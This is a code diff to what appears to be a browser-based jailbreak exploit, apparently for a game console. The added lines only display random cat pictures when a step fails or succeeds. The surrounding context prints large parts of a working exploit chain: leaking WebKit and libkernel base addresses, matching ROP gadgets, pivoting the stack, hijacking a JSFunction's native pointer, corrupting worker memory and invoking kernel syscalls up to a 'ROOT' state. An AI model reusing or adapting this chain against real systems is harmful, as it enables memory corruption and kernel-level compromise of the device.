@@ -17,6 +17,28 @@ function post(tag, detail) {
     } catch (e) { }
 }
 
+function randomNeko(jelbreksolution) {
+    const overlay = document.getElementById("cat-fullscreen-overlay");
+    const img = document.getElementById("cat-random-img");
+
+    let nekofolder = "";
+    let sillycars = 0;
+
+    if (jelbreksolution === "jelbreksusec") {
+        nekofolder = "susec";
+        sillycars = 50;
+    } else if (jelbreksolution === "jelbrekfeil") {
+        nekofolder = "feil";
+        sillycars = 60;
+    }
+
+    if (sillycars > 0) {
+        const num = Math.floor(Math.random() * sillycars) + 1;
+        img.src = `${nekofolder}/${num}.jpg`;
+        overlay.style.display = "flex";
+    }
+}
+
 const VERBOSE = new URLSearchParams(location.search).get("verbose") === "1";
 
 const PROSE = [
@@ -309,7 +331,7 @@ function makeRpc(worker) {
         const libkernelBase = p.read8(g(off.wk___imp___error)).sub32(off.k__error);
         mark("BASES", "webkit=" + webkitBase + " libkernel=" + libkernelBase);
         if (!plausibleBase(webkitBase) || !plausibleBase(libkernelBase)) {
-            state("a base looks wrong", "bad"); return;
+            state("a base looks wrong", "bad"); randomNeko("jelbrekfeil"); return;
         }
 
         const GADGETS = [
@@ -369,11 +391,11 @@ function makeRpc(worker) {
         }
         check("gadget-table-fits-module", !fatal,
             gated + "/" + GADGETS.length + " gated");
-        if (fatal) { state("gadget bytes did not match", "bad"); return; }
+        if (fatal) { state("gadget bytes did not match", "bad"); randomNeko("jelbrekfeil"); return; }
         const argGadget = [G.POP_RDI_RET, G.POP_RSI_RET, G.POP_RDX_RET,
                            G.POP_RCX_RET, G.POP_R8_RET, G.POP_R9_RET];
         check("5-argument-calls-possible-pop-r8", !!argGadget[4], "");
-        if (!argGadget[4]) { state("no pop r8", "bad"); return; }
+        if (!argGadget[4]) { state("no pop r8", "bad"); randomNeko("jelbrekfeil"); return; }
 
         const SYS9 = { mmap: 0x1dd, jitshm_create: 0x215, kexec: 0x295 };
         const wanted = [];
@@ -429,7 +451,7 @@ function makeRpc(worker) {
             missing.length === 0,
             missing.length ? "missing: " + missing.join(",")
                 : Object.keys(SYS).length + "/" + Object.keys(SYS).length);
-        if (missing.length) { state("missing syscall stubs", "bad"); return; }
+        if (missing.length) { state("missing syscall stubs", "bad"); randomNeko("jelbrekfeil"); return; }
 
         {
             const got9 = [];
@@ -488,7 +510,7 @@ function makeRpc(worker) {
         }
         const mainCtx = makeCtx("main"), wrkCtx = makeCtx("worker");
         check("chain-contexts-round-tripped", !!mainCtx && !!wrkCtx, "");
-        if (!mainCtx || !wrkCtx) { state("backing stores failed", "bad"); return; }
+        if (!mainCtx || !wrkCtx) { state("backing stores failed", "bad"); randomNeko("jelbrekfeil"); return; }
 
         function layout(c, insts, targetIdx) {
             c.stackU8.fill(0); c.frameU8.fill(0);
@@ -552,7 +574,7 @@ function makeRpc(worker) {
         const mFuncAt = execAddr.add32(off.wk_JSFunction_m_function);
         origNative = p.read8(mFuncAt);
         if (!sameI64(origNative, nativeFn)) {
-            state("m_function moved under us", "bad"); return;
+            state("m_function moved under us", "bad"); randomNeko("jelbrekfeil"); return;
         }
         const mainPivotObj = {};
         keepAlive.push(mainPivotObj);
@@ -625,7 +647,7 @@ function makeRpc(worker) {
                               mainCtx.frameDv.getUint32(12, true));
         check("main-thread-pivot-lands", sameI64(wit, mainCtx.P),
             wit + " want " + mainCtx.P);
-        if (!sameI64(wit, mainCtx.P)) { state("pivot failed", "bad"); return; }
+        if (!sameI64(wit, mainCtx.P)) { state("pivot failed", "bad"); randomNeko("jelbrekfeil"); return; }
         const pid = sc(SYS.getpid).i32;
         mark("PID", String(pid));
 
@@ -694,7 +716,7 @@ function makeRpc(worker) {
         const D = bufAddr(markerArr.buffer);
         if ((p.read4(D) >>> 0) !== SENT_LO) {
             check("transferred-store-worker-memory", false, "D=" + D);
-            state("transfer did not preserve the store", "bad"); return;
+            state("transfer did not preserve the store", "bad"); randomNeko("jelbrekfeil"); return;
         }
         function ptrish(v) { return v.hi > 0 && v.hi < 0x10000 && (v.low & 7) === 0; }
         const storage = p.read8(D.add32(0x10));
@@ -702,7 +724,7 @@ function makeRpc(worker) {
         if (!markerCell || !ptrish(markerCell)) {
             check("walk-reached-worker-marker", false,
                 "storage=" + storage + " cell=" + markerCell);
-            state("walk failed -- run step 4b for the dump", "bad"); return;
+            state("walk failed -- run step 4b for the dump", "bad"); randomNeko("jelbrekfeil"); return;
         }
         const butterfly = p.read8(markerCell.add32(8));
         let wMaster = null, wVictim = null, wLeak = null;
@@ -717,7 +739,7 @@ function makeRpc(worker) {
         }
         check("walk-found-worker-victim-master",
             !!(wMaster && wVictim && wLeak), "master=" + wMaster);
-        if (!(wMaster && wVictim && wLeak)) { state("walk failed", "bad"); return; }
+        if (!(wMaster && wVictim && wLeak)) { state("walk failed", "bad"); randomNeko("jelbrekfeil"); return; }
         wMasterAddr = wMaster;
         origWorkerVector = p.read8(wMaster.add32(0x10));
         p.write8(wMaster.add32(0x10), wVictim);
@@ -3811,6 +3833,8 @@ function makeRpc(worker) {
                     : jailbroken ? "ROOT -- NO REBOOT NEEDED"
                     : "REPAIRED -- NO REBOOT NEEDED";
                 stateEl.className = "ok";
+                console.log("NekoSusec")
+                randomNeko("jelbreksusec");
             } catch (e) { }
         }
     }
